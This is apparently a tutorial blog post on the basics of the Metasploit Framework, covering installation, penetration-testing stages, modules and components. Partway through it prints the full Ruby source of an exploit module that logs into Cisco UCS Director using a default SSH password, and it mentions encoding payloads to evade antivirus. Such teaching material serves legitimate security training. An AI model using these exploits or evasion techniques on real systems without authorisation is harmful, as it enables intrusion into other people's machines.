Metasploit, one of the most widely used penetration testing tools, is a very powerful all-in-one tool for performing different steps of a penetration test.

If you ever tried to exploit some vulnerable systems, chances are you have used Metasploit, or at least, are familiar with the name. It allows you to find information about system vulnerabilities, use existing exploits to penetrate the system, helps create your own exploits, and much more.

In this tutorial, we’ll be covering the basics of Metasploit Framework in detail and show you real examples of how to use this powerful tool to the fullest.

Table of Contents
Installing Metasploit
Installing Metasploit on Linux
Find out the version of Metasploit and updating
Basics of Penetration testing
1. Information gathering / Reconnaissance
2. Vulnerability Analysis
3. Exploitation
4. Post Exploitation
5. Report
Basics of Metasploit Framework
Modules of Metasploit Framework
1. Exploits
2. Payloads
3. Auxiliaries
4. Encoders
Components of Metasploit Framework
1. msfconsole
2. msfdb
3. msfvenom
4. meterpreter
Metasploit location on the drive
Basic commands of Metasploit Framework
Show command
Search anything within Metasploit
The use command
Get the description of the module with the info command
See the options you need to specify for the modules
Use the set command to set a value to a variable
Choose the Payload
Check if the exploit will work or not
A penetration test walkthrough
Target identification and Host discovery
Port scanning & Service detection
Vulnerability Analysis
Exploiting Vulnerabilities
Exploiting the VSFTPD vulnerability
Keeping the sessions in the background
Exploiting samba smb
Exploiting VNC
Post Exploitation tasks with Metasploit & Meterpreter
What is Meterpreter?
Upgrade to a meterpreter from shell
Meterpreter functionalities
Staying persistently on the exploited machine
Create custom payloads with msfvenom
Check all options for creating your payload
Encoding your payload to evade detection
Checking if your payload can evade anti-virus programs
Conclusion
Installing Metasploit
Metasploit is available for Windows and Linux OS, and you can download the source files from the official repository of the tool in Github. If you are running any OS designed for penetration testing, e.g., Kali Linux, it will be pre-installed in your system. We’ll be covering how to use Metasploit Framework version 6 on Kali Linux. However, the basics will remain the same wherever you’re using Metasploit.

Installing Metasploit on Linux
To install Metasploit in Linux you have to get the package metasploit-framework. On Debian and Ubuntu based Linux distros, you can use the apt utility:

apt install metasploit-framework
On CentOS/Redhat you can the yum utility to do the same:

yum install metasploit-framework
Find out the version of Metasploit and updating
If you’re not sure if you have Metasploit or not, you can confirm by typing msfconsole in your terminal:

msfconsole
 _                                                    _
/ \    /\         __                         _   __  /_/ __                                                                                                                                                      
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                                                                                                                                     
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                                                                                                                                    
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                                                                                                                                    
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                                                                                                                                   
                                                                                                                                                                                                                 

       =[ metasploit v6.1.27-dev                          ]
+ – – =[ 2196 exploits - 1162 auxiliary - 400 post       ]
+ – – =[ 596 payloads - 45 encoders - 10 nops            ]
+ – – =[ 9 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try 
globally setting it with setg RHOSTS x.x.x.x
Metasploit Tip: Start commands with a space to avoid saving them to history

As you can see my machine already has Metasploit Framework installed.

Metasploit changes its greeting messages every time you fire up the Metasploit Framework with the msfconsole command, so you might see a different greeting message when you run it.

You can also find out which version is installed once the program loads. Type in version and hit enter to get the answer:

version
Framework: 6.1.27-dev
Console  : 6.1.27-dev
I am using version 6. If you haven’t updated your Metasploit anytime soon, it’s a good idea to update it before starting to use it. This is because if the tool is old then the updated exploits will not get added to the database of your Metasploit Framework. You can update the program by the msfupdate command:

msf6 > msfupdate

[*] exec: msfupdate

msfupdate is no longer supported when Metasploit is part of the operating

system. Please use ‘apt update; apt install metasploit-framework’

As you can see the msfupdate command is not supported. This happened because Metasploit is already a part of the operating system in the Kali Linux updated versions. If you’re using older versions of the Kali Linux, this command will work fine for your system.

Now that you know how to install and update the Metasploit framework, let’s begin learning some of the basics related to Metasploit.

Basics of Penetration testing
Before we begin, let’s familiarize ourselves with some of the steps of a penetration test briefly. If you’re already familiar with the concept then you can just skip ahead to the good part. Let’s list some of the fundamental steps in penetration testing:

Information Gathering / Reconnaissance
Vulnerability Analysis
Exploitation
Post Exploitation
Report
1. Information gathering / Reconnaissance
At the very beginning of any penetration testing, information gathering is done. The more information you can gather about the target, the better it will be for you to know the target system and use the information later in the process. Information may include crucial information like the open ports, running services, or general information such as the domain name registration information. Various techniques and tools are used for gathering information about the target such as – nmap, zenmap, whois, nslookup, dig, maltego, etc.

One of the most used tools for information gathering and scanning is the nmap or Network Mapper utility. For a comprehensive tutorial for information gathering and nmap which you can check out from here.

2. Vulnerability Analysis
In this step, the potential vulnerabilities of the target are analyzed for further actions. Not all the vulnerabilities are of the same level. Some vulnerabilities may give you entire access to the system once exploited while some may only give you some normal information about the system. The vulnerabilities that might lead to some major results are the ones to go forward with from here. This is the step where Metasploit gives you a useful database to work with.

3. Exploitation
After the identified vulnerabilities have been analyzed, this is the step to take advantage of the vulnerabilities.

In this step, specific programs/exploits are used to attack the machine with the vulnerabilities.

You might wonder, where do these exploits come from?

Exploits come from many sources. One of the primary source is the vulnerability and exploit researchers. People do it because there is a lot at stake here i.e., there may be huge sums of money involved as a bounty.

Now, you may ask if the vulnerabilities are discovered, aren’t those application already fixed? The answer is yes, they are. But the fix comes around in the next update of the application.

Those who are already using the outdated version might not get the update and remains vulnerable to the exploits. The Metasploit Framework is the most suitable tool for this step. It gives you the option to choose from thousands of exploits and use them directly from the Metasploit console. New exploits are updated and incorporated in Metasploit regularly. You may also add some other exploits from online exploit databases like Exploit-DB.

Further, not all the exploits are ready-made for you to use. Sometimes you might have to craft your own exploit to evade security systems and intrusion detection systems. Metasploit also has different options for you to explore on this regard.

4. Post Exploitation
This is the step after you’ve already completed exploiting the target system. You’ve got access to the system and this is where you will decide what to do with the system. You may have got access to a low privilege user. You will try to escalate your privilege in this step. You may also keep a backdoor the victim machine to allow yourself to enter the system later whenever you want. Metasploit has numerous functionalities to help you in this step as well.

5. Report
This is the step that many penetration testers will have to complete. After carrying out their testing, the company or the organization will require them to write a detailed report about the testing and improvement to be done.

Now, after the long wait, let’s get into the basics of the actual program – Metasploit Framework.

Basics of Metasploit Framework
In this section, we’ll learn all the basics related to Metasploit Framework. This will help us understand the terminologies related to the program and use the basic commands to navigate through.

Modules of Metasploit Framework
As discussed earlier, Metasploit can be used in most of the penetration testing steps. The core functionalities that Metasploit provides can be summarized by some of the modules:

Exploits
Payloads
Auxiliaries
Encoders
Now we’ll discuss each of them and explain what they mean.

1. Exploits
Exploit is the program that is used to attack the vulnerabilities of the target. There is a large database for exploits on Metasploit Framework. You can search the database for the exploits and see the information about how they work, the time they were discovered, how effective they are, and so on.

2. Payloads
Payloads perform some tasks after the exploit runs. There are different types of payloads that you can use. For example, you could use the reverse shell payload, which basically generates a shell/terminal/cmd in the victim machine and connects back to the attacking machine.

Another example of a payload would be the bind shell. This type of shell creates a listening port on the victim machine, to which the attacker machine then connects. The advantage of a reverse shell over the bind shell is that the majority of the system firewalls generally do not block the outgoing connections as much as they block the incoming ones.

Metasploit Framework has a lot of options for payloads. Some of the most used ones are the reverse shell, bind shell, meterpreter, etc.

3. Auxiliaries
These are the programs that do not directly exploit a system. Rather they are built for providing custom functionalities in Metasploit. Some auxiliaries are sniffers, port scanners, etc. These may help you scan the victim machine for information gathering purposes. For example, if you see a victim machine is running ssh service, but you could not find out what version of ssh it is using – you could scan the port and get the version of ssh using auxiliary modules.

4. Encoders
Metasploit also provides you with the option to use encoders that will encrypt the codes in such a way that it becomes obscure for the threat detection programs to interpret. They will self decrypt and become original codes when executed. However, the encoders are limited and the anti-virus has many signatures of them already in their databases. So, simply using an encoder will not guarantee anti-virus evasion. You might get past some of the anti-viruses simply using encoders though. You will have to get creative and experiment changing the payload so it does not get detected.

Components of Metasploit Framework
Metasploit is open-source and it is written in Ruby. It is an extensible framework, and you can build custom features of your likings using Ruby. You can also add different plugins. At the core of the Metaslpoit framework, there are some key components:

msfconsole
msfdb
msfvenom
meterpreter
Let’s talk about each of these components.

1. msfconsole
This is the command line interface that is used by the Metasploit Framework. It enables you to navigate through all the Metasploit databases at ease and use the required modules. This is the command that you entered before to get the Metasploit console.

2. msfdb
Managing all the data can become a hurdle real quick, which is why Metasploit Framework gives you the option to use PostgreSQL database to store and access your data quickly and efficiently. For example, you may store and organize your scan results in the database to access them later. You can take a look at this tutorial to learn more about this tool – https://null-byte.wonderhowto.com/how-to/use-metasploits-database-stay-organized-store-information-while-hacking-0192643/

3. msfvenom
This is the tool that mimics its name and helps you create your own payloads (venoms to inject in your victim machine). This is important since your payload might get detected as a threat and get deleted by threat detection software such as anti-viruses or anti-malware.

This happens because the threat detection systems already has stored fingerprints of many malicious payloads. There are some ways you can evade detection. We’ll discuss this in the later section dedicated to msfvenom.

4. meterpreter
meterpreter is an advanced payload that has a lot of functionalities built into it. It communicates using encrypted packets. Furthermore, meterpreter is quite difficult to trace and locate once in the system. It can capture screenshots, dump password hashes, and many more.

Metasploit location on the drive
Metasploit Framework is located in /usr/share/metasploit-framework/ directory. You can find out all about its components and look at the exploit and payload codes. You can also add your own exploits here to access it from the Metasploit console.

Let’s browse through the Metasploit directory:

cd /usr/share/metasploit-framework
Type in ls to see the contents of the directory:

ls
app                           msfconsole       Rakefile
config                        msfd             ruby
data                          msfdb            script-exploit
db                            msf-json-rpc.ru  script-password
documentation                 msfrpc           script-recon
Gemfile                       msfrpcd          scripts
Gemfile.lock                  msfupdate        tools
lib                           msfvenom         vendor
metasploit-framework.gemspec  msf-ws.ru
modules                       plugins
As you can see, there is a directory called modules, which should contain the exploits, payloads, auxiliaries, encoders, as discussed before. Let’s get into it:

cd modules
ls
auxiliary  encoders  evasion  exploits  nops  payloads  post
All the modules discussed are present here. However, evasion, nops, and post are the additional entries. The evasion module is a new entry to the Metasploit Framework, which helps create payloads that evade anti-virus (AV) detection. Nop stands for no operation, which means the CPU will just move to the next operation. Nops help create randomness in the payload – as adding them does not change the functionality of the program.

Finally, the post module contains some programs that you might require post-exploitation. For example, you might want to discover if the host you exploited is a Virtual Machine or a Physical Computer. You can do this with the checkvm module found in the post category. Now you can browse all the exploits, payloads, or others and take a look at their codes. Let’s navigate to the exploits directory and select an exploit. Then we’ll take a look at the codes of that exploit.

cd exploits
ls
aix        dialup                     firefox  mainframe  qnx
android    example_linux_priv_esc.rb  freebsd  multi      solaris
apple_ios  example.py                 hpux     netware    unix
bsd        example.rb                 irix     openbsd    windows
bsdi       example_webapp.rb          linux    osx
What you’re seeing now are the categories of the exploits. For example, the linux directory contains all the exploits that are available for Linux systems.

cd linux
ls
antivirus  games  imap   mysql     pptp   samba  ssh
browser    http   local  pop3      proxy  smtp   telnet
ftp        ids    misc   postgres  redis  snmp   upnp
Let’s take a look at the exploits for ssh.

cd ssh
ls
ceragon_fibeair_known_privkey.rb
cisco_ucs_scpuser.rb
exagrid_known_privkey.rb
f5_bigip_known_privkey.rb
ibm_drm_a3user.rb
loadbalancerorg_enterprise_known_privkey.rb
mercurial_ssh_exec.rb
microfocus_obr_shrboadmin.rb
quantum_dxi_known_privkey.rb
quantum_vmpro_backdoor.rb
solarwinds_lem_exec.rb
symantec_smg_ssh.rb
vmware_vdp_known_privkey.rb
vyos_restricted_shell_privesc.rb
As you can see, all the exploits are written in Ruby, and thus, the extension of the files is .rb. Now let’s look at the code of a specific exploit using the cat command, which outputs the content directly on the terminal:

cat cisco_ucs_scpuser.rb
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'net/ssh/command_stream'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SSH

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Cisco UCS Director default scpuser password",
      'Description'    => %q{
        This module abuses a known default password on Cisco UCS Director. The 'scpuser'
        has the password of 'scpuser', and allows an attacker to login to the virtual appliance
        via SSH.
        This module  has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0.
        Note that Cisco also mentions in their advisory that their IMC Supervisor and
        UCS Director Express are also affected by these vulnerabilities, but this module
        was not tested with those products.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2019-1935' ],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-usercred' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Aug/36' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-ucs-rce.txt' ]
        ],
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'thread'
        },
      'Payload'        =>
        {
          'Compat' => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find'
          }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          [ 'Cisco UCS Director < 6.7.2.0', {} ],
        ],
      'Privileged'     => false,
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2019-08-21'
    ))

    register_options(
      [
        Opt::RPORT(22),
        OptString.new('USERNAME', [true,  "Username to login with", 'scpuser']),
        OptString.new('PASSWORD', [true,  "Password to login with", 'scpuser']),
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def do_login(user, pass)
    factory = ssh_socket_factory
    opts = {
      :auth_methods    => ['password', 'keyboard-interactive'],
      :port            => rport,
      :use_agent       => false,
      :config          => false,
      :password        => pass,
      :proxy           => factory,
      :non_interactive => true,
      :verify_host_key => :never
    }

    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

    begin
      ssh = nil
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh = Net::SSH.start(rhost, user, opts)
      end
    rescue Rex::ConnectionError
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end

    if ssh
      conn = Net::SSH::CommandStream.new(ssh)
      ssh = nil
      return conn
    end

    return nil
  end

  def exploit
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']

    print_status("#{rhost}:#{rport} - Attempt to login to the Cisco appliance...")
    conn = do_login(user, pass)
    if conn
      print_good("#{rhost}:#{rport} - Login Successful (#{user}:#{pass})")
      handler(conn.lsock)
    end
  end
end
You can see the code for the exploit is shown here. The green marked section is the description of the exploit and the yellow marked portion is the options that can be set for this exploit.

The description reveals what function this exploit will perform. As you can see, it exploits a known vulnerability of Cisco UCS Director. The vulnerability is the default password of the machine, which, if unchanged, may be used to gain access to the system. If you are someone who knows Ruby and has a good grasp of how the vulnerability works, you can modify the code and create your own version of the exploit. That’s the power of the Metasploit Framework.

In this way, you can also find out what payloads are there in your Metasploit Framework, add your own in the directory, and modify the existing ones.

Basic commands of Metasploit Framework
Now let’s move on to the fun stuff. In this section, we’ll talk about some of the basic Metasploit commands that you’re going to need all the time.

Fire up the Metasploit console by typing in msfconsole. Now you will see msf6 > indicating you’re in the interactive mode.

msfconsole
I have the msf6 shown here, where 6 represents the version of the framework and console. You can execute regular terminal commands from here as well, which means you don’t have to exit out of Metasploit Framework to perform some other tasks, making it super convenient. Here’s an example – msf6 > ls

[*] exec: ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Vi
